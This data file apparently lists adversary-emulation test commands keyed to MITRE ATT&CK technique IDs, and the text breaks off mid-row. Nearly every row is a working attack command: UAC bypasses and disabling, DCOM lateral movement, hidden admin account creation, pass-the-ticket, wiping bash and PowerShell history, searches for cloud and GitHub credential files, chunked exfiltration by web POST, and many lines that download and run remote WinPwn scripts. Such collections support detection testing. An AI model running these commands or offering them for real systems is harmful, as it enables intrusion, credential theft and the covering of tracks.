T1021,PowerShell Lateral Movement using MMC20,"[activator]::createinstance([type]::gettypefromprogid(""mmc20.application"",""#{computer_name}"")).document.activeview.executeshellcommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")"
T1021,PowerShell Lateral Movement Using Excel Application Object,"copy c:\windows\system32\calc.exe 'c:\users\#{user}\appdata\local\microsoft\windowsapps\foxprow.exe' $com = [system.activator]::createinstance([type]::gettypefromprogid(""excel.application"",""#{computer_name}"")) $com.activatemicrosoftapp(""5"")"
T1078,Create local account with admin privileges,net user art-test /add net user art-test #{password} net localgroup administrators art-test /add
T1078,Create local account with admin privileges - MacOS,"dscl . -create /users/atomicuser dscl . -create /users/atomicuser usershell /bin/bash dscl . -create /users/atomicuser realname ""atomic user"" dscl . -create /users/atomicuser uniqueid 503 dscl . -create /users/atomicuser primarygroupid 503 dscl . -create /users/atomicuser nfshomedirectory /local/users/atomicuser dscl . -passwd /users/atomicuser mysecretpassword dscl . -append /groups/admin groupmembership atomicuser"
T1078,Create local account with admin privileges using sysadminctl utility - MacOS,sysadminctl interactive -adduser art-tester -fullname artuser -password !pass123! -admin
T1078,Enable root account using dsenableroot utility - MacOS,dsenableroot #current user dsenableroot -u art-tester -p art-tester -r art-root #new user
T1078,Add a new/existing user to the admin group using dseditgroup utility - macOS,dseditgroup -o edit -a art-user -t user admin
T1078,WinPwn - Loot local Credentials - powerhell kittie,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') obfuskittiedump -consoleoutput -noninteractive
T1078,WinPwn - Loot local Credentials - Safetykatz,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') safedump -consoleoutput -noninteractive
T1078,Create local account (Linux),"password=$(openssl passwd -1 art) ([ ""$(uname)"" = 'linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) su art -c ""whoami; exit"""
T1078,Reactivate a locked/expired account (Linux),"useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art usermod --lock art usermod --expiredate ""1"" art usermod --unlock art usermod --expiredate ""99999"" art su -c whoami art"
T1078,Reactivate a locked/expired account (FreeBSD),pw useradd art -g wheel -s /bin/sh echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 pw lock art pw usermod art -e +1d pw unlock art pw user mod art -e +99d su art whoami exit
T1078,Login as nobody (Linux),"cat /etc/passwd |grep nobody chsh --shell /bin/bash nobody usermod --password $(openssl passwd -1 nobody) nobody su -c ""whoami"" nobody"
T1078,Login as nobody (freebsd),cat /etc/passwd |grep nobody pw usermod nobody -s /bin/sh echo $(openssl passwd -1 art) | pw mod user nobody -h 0 su nobody whoami exit
T1078,Use PsExec to elevate to NT Authority\SYSTEM account,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula -s %comspec% /c whoami"
T1030,Data Transfer Size Limits,cd #{folder_path}; split -b 5000000 #{file_name} ls -l #{folder_path}
T1030,Network-Based Data Transfer in Small Chunks,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1548,Bypass UAC using Event Viewer (cmd),"reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""#{executable_binary}"" /f cmd.exe /c eventvwr.msc"
T1548,Bypass UAC using Event Viewer (PowerShell),"new-item ""hkcu:\software\classes\mscfile\shell\open\command"" -force set-itemproperty ""hkcu:\software\classes\mscfile\shell\open\command"" -name ""(default)"" -value ""#{executable_binary}"" -force start-process ""c:\windows\system32\eventvwr.msc"""
T1548,Bypass UAC using Fodhelper,"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""#{executable_binary}"" /f reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""delegateexecute"" /f fodhelper.exe"
T1548,Bypass UAC using Fodhelper - PowerShell,"new-item ""hkcu:\software\classes\ms-settings\shell\open\command"" -force new-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""delegateexecute"" -value """" -force set-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""(default)"" -value ""#{executable_binary}"" -force start-process ""c:\windows\system32\fodhelper.exe"""
T1548,Bypass UAC using ComputerDefaults (PowerShell),"new-item ""hkcu:\software\classes\ms-settings\shell\open\command"" -force new-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""delegateexecute"" -value """" -force set-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""(default)"" -value ""#{executable_binary}"" -force start-process ""c:\windows\system32\computerdefaults.exe"""
T1548,Bypass UAC by Mocking Trusted Directories,"mkdir ""\\?\c:\windows \system32\"" copy ""#{executable_binary}"" ""\\?\c:\windows \system32\mmc.exe"" mklink c:\testbypass.exe ""\\?\c:\windows \system32\mmc.exe"""
T1548,Bypass UAC using sdclt DelegateExecute,"new-item -force -path ""hkcu:\software\classes\folder\shell\open\command"" -value '#{command_to_execute}' new-itemproperty -force -path ""hkcu:\software\classes\folder\shell\open\command"" -name ""delegateexecute"" start-process -filepath $env:windir\system32\sdclt.exe start-sleep -s 3"
T1548,Disable UAC using reg.exe,reg.exe add hklm\software\microsoft\windows\currentversion\policies\system /v enablelua /t reg_dword /d 0 /f
T1548,Bypass UAC using SilentCleanup task,"""#{file_path}"""
T1548,UACME Bypass Method 23,"""#{uacme_exe}"""
T1548,UACME Bypass Method 31,"""#{uacme_exe}"""
T1548,UACME Bypass Method 33,"""#{uacme_exe}"""
T1548,UACME Bypass Method 34,"""#{uacme_exe}"""
T1548,UACME Bypass Method 39,"""#{uacme_exe}"""
T1548,UACME Bypass Method 56,"""#{uacme_exe}"""
T1548,UACME Bypass Method 59,"""#{uacme_exe}"""
T1548,UACME Bypass Method 61,"""#{uacme_exe}"""
T1548,WinPwn - UAC Magic,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') uacbypass -noninteractive -command ""c:\windows\system32\cmd.exe"" -technique magic"
T1548,WinPwn - UAC Bypass ccmstp technique,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') uacbypass -noninteractive -command ""c:\windows\system32\calc.exe"" -technique ccmstp"
T1548,WinPwn - UAC Bypass DiskCleanup technique,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') uacbypass -noninteractive -command ""c:\windows\system32\cmd.exe"" -technique diskcleanup"
T1548,WinPwn - UAC Bypass DccwBypassUAC technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/creds/master/obfuscatedps/dccuac.ps1')
T1548,Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,$orgvalue =(get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name consentpromptbehavioradmin).consentpromptbehavioradmin set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name consentpromptbehavioradmin -value 0 -type dword -force
T1548,UAC Bypass with WSReset Registry Modification,"new-item #{commandpath} -force | out-null new-itemproperty -path #{commandpath} -name ""delegateexecute"" -value """" -force | out-null set-itemproperty -path #{commandpath} -name ""(default)"" -value ""#{commandtorun}"" -force -erroraction silentlycontinue | out-null $process = start-process -filepath ""c:\windows\system32\wsreset.exe"" -windowstyle hidden"
T1548,Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name promptonsecuredesktop -value 0 -type dword -force
T1548,Disable UAC notification via registry keys,"reg add ""hklm\software\microsoft\security center"" /v uacdisablenotify /t reg_dword /d 1 /f"
T1548,Disable ConsentPromptBehaviorAdmin via registry keys,"reg add ""hklm\software\microsoft\windows\currentversion\policies\system"" /v consentpromptbehavioradmin /t reg_dword /d 0 /f"
T1548,UAC bypassed by Utilizing ProgIDs registry.,"reg add ""hkey_current_user\software\classes\.pwn\shell\open\command"" /ve /d ""c:\windows\system32\calc.exe"" /f reg add ""hkey_current_user\software\classes\ms-settings\curver"" /ve /d "".pwn"" /f echo triggering fodhelper.exe for potential privilege escalation... start fodhelper.exe"
T1204,Malicious Execution from Mounted ISO Image,"iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.003/src/qbot-test.iso"" -outfile ""$env:temp\qbot-test.iso"") mount-diskimage -imagepath ""$env:temp\qbot-test.iso"" $mountedpath = (get-diskimage -imagepath ""$env:temp\qbot-test.iso"" | get-volume).driveletter $finalpath = $mountedpath + "":\"" cd $finalpath .\calc.exe.lnk"
T1550,Mimikatz Kerberos Ticket Attack,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}"""
T1550,Rubeus Kerberos Pass The Ticket,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\#{target} -w c:\ -c ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi set-location ""pathtoatomicsfolder\..\externalpayloads"" move-item -force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi write-host ""successfully retrieved tgt from '#{target}', now requesting a tgs from local"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge"
T1070,Clear Bash history (rm),rm #{history_path}
T1070,Clear Bash history (echo),"echo """" > #{history_path}"
T1070,Clear Bash history (cat dev/null),cat /dev/null > #{history_path}
T1070,Clear Bash history (ln dev/null),ln -sf /dev/null #{history_path}
T1070,Clear Bash history (truncate),truncate -s0 #{history_path}
T1070,Clear history of a bunch of shells,unset histfile export histfilesize=0 history -c
T1070,Clear and Disable Bash History Logging,set +o history echo 'set +o history' >> ~/.bashrc . ~/.bashrc history -c
T1070,Use Space Before Command to Avoid Logging to History,hostname whoami
T1070,Disable Bash History Logging with SSH -T,sshpass -p 'pwd101!' ssh testuser1@localhost -t hostname
T1070,Clear Docker Container Logs,docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log
T1070,Prevent Powershell History Logging,set-psreadlineoption -historysavestyle savenothing
T1070,Clear Powershell History by Deleting History File,remove-item (get-psreadlineoption).historysavepath
T1070,Set Custom AddToHistoryHandler to Avoid History File Logging,set-psreadlineoption -addtohistoryhandler { return $false }
T1070,Clear PowerShell Session History,clear-history
T1552,Find AWS credentials,"find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null"
T1552,Extract Browser and System credentials with LaZagne,python2 lazagne.py all
T1552,Extract passwords with grep,grep -ri password #{file_path} exit 0
T1552,Extracting passwords with findstr,findstr /si pass *.xml *.doc *.txt *.xls ls -r | select-string -erroraction silentlycontinue -pattern password
T1552,Access unattend.xml,type c:\windows\panther\unattend.xml type c:\windows\panther\unattend\unattend.xml
T1552,Find and Access Github Credentials,for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
T1552,WinPwn - sensitivefiles,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') sensitivefiles -noninteractive -consoleoutput
T1552,WinPwn - Snaffler,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') snaffler -noninteractive -consoleoutput
T1552,WinPwn - powershellsensitive,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') powershellsensitive -consoleoutput -noninteractive
T1552,WinPwn - passhunt,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') passhunt -local $true -noninteractive
T1552,WinPwn - SessionGopher,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') sessiongopher -noninteractive -consoleoutput
T1552,"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') sharpcloud -consoleoutput -noninteractive
T1552,List Credential Files via PowerShell,$usernameinfo = (get-childitem env:username).value get-childitem -hidden c:\users\$usernameinfo\appdata\roaming\microsoft\credentials\ get-childitem -hidden c:\users\$usernameinfo\appdata\local\microsoft\credentials\
T1552,List Credential Files via Command Prompt,dir /a:h c:\users\%username%\appdata\local\microsoft\credentials\ dir /a:h c:\users\%username%\appdata\roaming\microsoft\credentials\
T1552,Find Azure credentials,"find #{file_path}/.azure -name ""msal_token_cache.json"" -o -name ""accesstokens.json"" -type f 2>/dev/null"
T1552,Find GCP credentials,"find #{file_path}/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null"
T1552,Find OCI credentials,"find #{file_path}/.oci/sessions -name ""token"" -type f 2>/dev/null"
T1082,System Information Discovery,systeminfo reg query hklm\system\currentcontrolset\services\disk\enum
T1082,System Information Discovery,system_profiler ls -al /applications
T1082,List OS Information,uname -a >> #{output_file} if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi uptime >> #{output_file} cat #{output_file} 2>/dev/null
T1082,Linux VM Check via Hardware,"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""droplet\|hvm\|virtualbox\|vmware""; fi if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""xen\|bochs\|qemu""; fi if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""xen\|kvm\|microsoft""; fi"
T1082,Linux VM Check via Kernel Modules,"sudo lsmod | grep -i ""vboxsf\|vboxguest"" sudo lsmod | grep -i ""vmw_baloon\|vmxnet"" sudo lsmod | grep -i ""xen-vbd\|xen-vnif"" sudo lsmod | grep -i ""virtio_pci\|virtio_net"" sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"""
T1082,FreeBSD VM Check via Kernel Modules,"kldstat | grep -i ""vmm"" kldstat | grep -i ""vbox"""
T1082,Hostname Discovery (Windows),hostname
T1082,Hostname Discovery,hostname
T1082,Windows MachineGUID Discovery,reg query hkey_local_machine\software\microsoft\cryptography /v machineguid
T1082,Griffon Recon,"cscript ""#{vbscript}"""
T1082,Environment variables discovery on windows,set
T1082,"Environment variables discovery on freebsd, macos and linux",env
T1082,Show System Integrity Protection status (MacOS),csrutil status
T1082,WinPwn - winPEAS,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') winpeas -noninteractive -consoleoutput
T1082,WinPwn - itm4nprivesc,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') itm4nprivesc -noninteractive -consoleoutput
T1082,WinPwn - Powersploits privesc checks,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') oldchecks -noninteractive -consoleoutput
T1082,WinPwn - General privesc checks,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') otherchecks -noninteractive -consoleoutput
T1082,WinPwn - GeneralRecon,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') generalrecon -consoleoutput -noninteractive
T1082,WinPwn - Morerecon,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') morerecon -noninteractive -consoleoutput
T1082,WinPwn - RBCD-Check,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') rbcd-check -consoleoutput -noninteractive
T1082,WinPwn - PowerSharpPack - Watson searching for missing windows patches,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpwatson.ps1') invoke-watson
T1082,WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpup.ps1') invoke-sharpup -command ""audit"""
T1082,WinPwn - PowerSharpPack - Seatbelt,"$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-seatbelt.ps1') invoke-seatbelt -command ""-group=all"""
T1082,Azure Security Scan with SkyArk,"import-module ""pathtoatomicsfolder\..\externalpayloads\azurestealth.ps1"" -force $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential connect-azuread -credential $credential scan-azureadmins -usecurrentcred"
T1082,Linux List Kernel Modules,lsmod kmod list grep vmw /proc/modules
T1082,FreeBSD List Kernel Modules,kldstat kldstat | grep vmm
T1082,System Information Discovery with WMIC,"wmic cpu get name wmic memphysical get maxcapacity wmic baseboard get product wmic baseboard get version wmic bios get smbiosbiosversion wmic path win32_videocontroller get name wmic path win32_videocontroller get driverversion wmic path win32_videocontroller get videomodedescription wmic os get caption,osarchitecture,version wmic diskdrive get caption get-wmiobject win32_bios"
T1082,System Information Discovery,wscript.exe c:\windows\system32\gathernetworkinfo.vbs
T1082,Check computer location,"reg query ""hkey_current_user\control panel\international\geo"""
T1082,BIOS Information Discovery through Registry,reg query hkey_local_machine\hardware\description\system /v systembiosversion reg query hkey_local_machine\hardware\description\system /v videobiosversion
T1082,ESXi - VM Discovery using ESXCLI,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1082,ESXi - Darkside system information discovery,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1082,sysctl to gather macOS hardware info,sysctl -n hw.model
T1082,operating system discovery ,"get-ciminstance win32_operatingsystem | select-object caption, version, servicepackmajorversion, osarchitecture, csname, windowsdirectory | out-null"
T1082,"Check OS version via ""ver"" command",ver
T1082,"Display volume shadow copies with ""vssadmin""",vssadmin.exe list shadows
T1082,Identify System Locale and Regional Settings with PowerShell,"powershell.exe -c ""get-culture | format-list | out-file -filepath %tmp%\a.txt"""
T1082,Enumerate Available Drives via gdr,"powershell.exe -c ""gdr -psprovider 'filesystem'"""
T1082,Discover OS Product Name via Registry,"reg query ""hklm\software\microsoft\windows nt\currentversion"" /v productname"
T1082,Discover OS Build Number via Registry,"reg query ""hklm\software\microsoft\windows nt\currentversion"" /v currentbuildnumber"
T1021,Enable Apple Remote Desktop Agent,sudo /system/library/coreservices/remotemanagement/ardagent.app/contents/resources/kickstart -activate -configure -allowaccessfor -allusers -privs -all -quiet
T1098,Admin Account Manipulate,"$x = get-random -minimum 2 -maximum 9999 $y = get-random -minimum 2 -maximum 9999 $z = get-random -minimum 2 -maximum 9999 $w = get-random -minimum 2 -maximum 9999 write-host haha_$x$y$z $fmm = get-localgroupmember -group administrators |?{ $_.objectclass -match ""user"" -and $_.principalsource -match ""local""} | select name foreach($member in $fmm) { if($member -like ""*administrator*"") { $account = $member.name.split(""\"")[-1] # strip computername\ $originaldescription = (get-localuser -name $account).description set-localuser -name $account -description ""atr:$account;$originaldescription"".substring(0,48) # keep original name in description rename-localuser -name $account -newname ""haha_$x$y$z"" # required due to length limitation write-host ""successfully renamed $account account on "" $env:computername } }"
T1098,Domain Account and Group Manipulate,"$x = get-random -minimum 2 -maximum 99 $y = get-random -minimum 2 -maximum 99 $z = get-random -minimum 2 -maximum 99 $w = get-random -minimum 2 -maximum 99 import-module activedirectory $account = ""#{account_prefix}-$x$y$z"" new-aduser -name $account -givenname ""test"" -displayname $account -samaccountname $account -surname $account -enabled:$false #{create_args} add-adgroupmember ""#{group}"" $account"
T1098,AWS - Create a group and add a user to that group,aws iam create-group --group-name #{username} aws iam add-user-to-group --user-name #{username} --group-name #{username}
T1098,Azure AD - adding user to Azure AD role,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $user = get-azureaduser -filter ""displayname eq '#{user_principal_name}' or userprincipalname eq '#{user_principal_name}'"" if ($user -eq $null) { write-warning ""user not found""; exit } $role = get-azureaddirectoryrole -filter ""displayname eq '#{role_name}'"" if ($role -eq $null) { write-warning ""role not found""; exit } add-azureaddirectoryrolemember -objectid $role.objectid -refobjectid $user.objectid write-host ""user $($user.displayname) was added to $($role.displayname) role"""
T1098,Azure AD - adding service principal to Azure AD role,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $sp = get-azureadserviceprincipal -filter ""displayname eq '#{service_principal_name}'"" if ($sp -eq $null) { write-warning ""service principal not found""; exit } $role = get-azureaddirectoryrole -filter ""displayname eq '#{role_name}'"" if ($role -eq $null) { write-warning ""role not found""; exit } add-azureaddirectoryrolemember -objectid $role.objectid -refobjectid $sp.objectid write-host ""service principal $($sp.displayname) was added to $($role.displayname)"""
T1098,Azure - adding user to Azure role in subscription,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $user = get-azaduser | where-object {$_.displayname -eq ""#{user_principal_name}"" -or $_.userprincipalname -eq ""#{user_principal_name}"" } if ($user -eq $null) { write-warning ""user not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $user.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""user $($user.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"""
T1098,Azure - adding service principal to Azure role in subscription,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $sp = get-azadserviceprincipal | where-object {$_.displayname -eq ""#{service_principal_name}""} if ($sp -eq $null) { write-warning ""service principal not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $sp.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""service principal $($sp.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"""
T1098,Azure AD - adding permission to application,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $aadapplication = new-azureadapplication -displayname ""#{application_name}"" $serviceprincipal = new-azureadserviceprincipal -appid $aadapplication.appid #$aadapplication = get-azureadapplication -filter ""displayname eq '#{application_name}'"" #get service principal of microsoft graph resource api $graphsp = get-azureadserviceprincipal -filter ""displayname eq 'microsoft graph'"" #initialize requiredresourceaccess for microsoft graph resource api $requiredgraphaccess = new-object microsoft.open.azuread.model.requiredresourceaccess $requiredgraphaccess.resourceappid = $graphsp.appid $requiredgraphaccess.resourceaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.resourceaccess] #set application permissions $applicationpermissions = @('#{application_permission}') $reqpermission = $graphsp.approles | where-object {$_.value -eq $applicationpermissions} if($reqpermission) { $resourceaccess = new-object microsoft.open.azuread.model.resourceaccess $resourceaccess.type = ""role"" $resourceaccess.id = $reqpermission.id #add required app permission $requiredgraphaccess.resourceaccess.add($resourceaccess) } else { write-host ""app permission $permission not found in the graph resource api"" -foregroundcolor red } #add required resource accesses $requiredresourcesaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.requiredresourceaccess] $requiredresourcesaccess.add($requiredgraphaccess) #set permissions in existing azure ad app set-azureadapplication -objectid $aadapplication.objectid -requiredresourceaccess $requiredresourcesaccess $serviceprincipal = get-azureadserviceprincipal -filter ""appid eq '$($aadapplication.appid)'"" new-azureadserviceapproleassignment -objectid $serviceprincipal.objectid -principalid $serviceprincipal.objectid -resourceid $graphsp.objectid -id $reqpermission.id"
T1098,Password Change on Directory Service Restore Mode (DSRM) Account,"ntdsutil ""set dsrm password"" ""sync from domain account #{sync_account}"" ""q"" ""q"""
T1098,Domain Password Policy Check: Short Password,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1098,Domain Password Policy Check: No Number in Password,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" 